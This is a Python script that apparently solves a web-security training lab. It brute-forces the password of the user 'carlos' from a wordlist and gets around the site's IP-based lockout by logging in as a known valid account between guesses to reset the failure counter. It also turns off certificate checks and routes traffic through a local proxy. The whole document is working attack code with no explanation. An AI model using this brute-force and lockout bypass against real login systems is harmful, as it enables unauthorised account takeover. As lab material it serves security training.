import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST     = sys.argv[1].strip()
WORDLIST = "../candidate_passwords.txt"

s = requests.Session()
s.verify  = False
s.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def login(username, password):
    data = {"username": username, "password": password}
    r = s.post(f"{HOST}/login", data=data, allow_redirects=False)
    return r

def bruteforce():
    for line in open(WORDLIST):
        password = line.strip()
        print(f"\r[*] Trying: {password:<20}", end="", flush=True)

        r = login("carlos", password)

        if "too many incorrect" in r.text:
            print("\n[-] Locked out, exiting...")
            sys.exit(1)

        if r.status_code == 302:
            print(f"\n[+] Found: carlos:{password}")
            return password

        login("wiener", "peter")  # reset IP counter

    print("\n[-] Not found")
    sys.exit(1)

if __name__ == "__main__":
    password = bruteforce()
    r = s.post(f"{HOST}/login", data={"username": "carlos", "password": password}, allow_redirects=True)
    if "Log out" in r.text:
        print("[+] Lab solved")
    else:
        print("[-] Failed")